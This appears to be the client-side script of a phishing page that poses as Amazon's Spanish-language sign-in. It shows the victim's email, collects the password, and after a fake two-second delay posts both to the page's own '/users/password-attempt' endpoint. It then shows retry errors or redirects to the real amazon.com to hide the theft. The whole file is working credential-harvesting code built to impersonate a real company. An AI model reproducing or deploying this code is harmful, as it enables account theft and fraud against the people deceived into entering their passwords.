(() => {
  try {
    if (localStorage.getItem("amazon_auth_complete")) {
      window.location.replace("https://www.amazon.com/-/es/");
      return;
    }
  } catch {}

  window.addEventListener("pageshow", (event) => {
    if (event.persisted) window.location.reload();
  });

  document.addEventListener("DOMContentLoaded", () => {
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");

    if (!email) {
      window.location.href = "/";
      return;
    }

    const userEmailDisplay = document.getElementById("userEmailDisplay");
    const form = document.getElementById("passwordForm");
    const passwordInput = document.getElementById("ap_password");
    const authErrorBox = document.getElementById("authErrorBox");
    const serverMsgText = document.getElementById("serverMsgText");
    const emptyErrorAlert = document.getElementById("auth-password-missing-alert");
    const submitBtn = document.getElementById("submitBtn");

    if (!form || !passwordInput || !submitBtn) return;

    if (userEmailDisplay) userEmailDisplay.textContent = email;

    const toggle = document.getElementById("showPasswordToggle");
    if (toggle) {
      toggle.addEventListener("change", () => {
        passwordInput.type = toggle.checked ? "text" : "password";
      });
    }

    function scrollToTop() {
      window.scrollTo({ top: 0, left: 0, behavior: "smooth" }); // [web:2]
    }

    passwordInput.addEventListener("input", () => {
      passwordInput.classList.remove("form-input-error");
      if (emptyErrorAlert) emptyErrorAlert.style.display = "none";
      if (authErrorBox) authErrorBox.style.display = "none";
      if (serverMsgText) serverMsgText.textContent = "";
    });

    function finishAndRedirect() {
      try {
        localStorage.setItem("amazon_auth_complete", "true");
      } catch {}
      window.location.href = "https://www.amazon.com/-/es/";
    }

    function showError(msg) {
      if (serverMsgText) serverMsgText.textContent = msg;
      if (authErrorBox) authErrorBox.style.display = "block";
      scrollToTop(); // subir al tope cuando se muestra error
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      if (authErrorBox) authErrorBox.style.display = "none";
      if (serverMsgText) serverMsgText.textContent = "";
      passwordInput.classList.remove("form-input-error");
      if (emptyErrorAlert) emptyErrorAlert.style.display = "none";

      const password = passwordInput.value;

      if (!password) {
        passwordInput.classList.add("form-input-error");
        if (emptyErrorAlert) emptyErrorAlert.style.display = "flex";
        passwordInput.focus();
        scrollToTop(); // subir al tope también aquí
        return;
      }

      submitBtn.disabled = true;

      try {
        await new Promise((r) => setTimeout(r, 2000));

        const res = await fetch("/users/password-attempt", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, password }),
        });

        let data = {};
        try {
          data = await res.json();
        } catch {
          data = {};
        }

        submitBtn.disabled = false;

        if (res.status === 409) {
          finishAndRedirect();
          return;
        }

        if (!res.ok) {
          showError(data.error || "Error de conexión");
          return;
        }

        if (data.message) {
          showError(data.message);
          passwordInput.value = "";
          passwordInput.focus();
          return;
        }

        finishAndRedirect();
      } catch {
        submitBtn.disabled = false;
        showError("No se pudo conectar al servidor.");
      }
    });
  });
})();
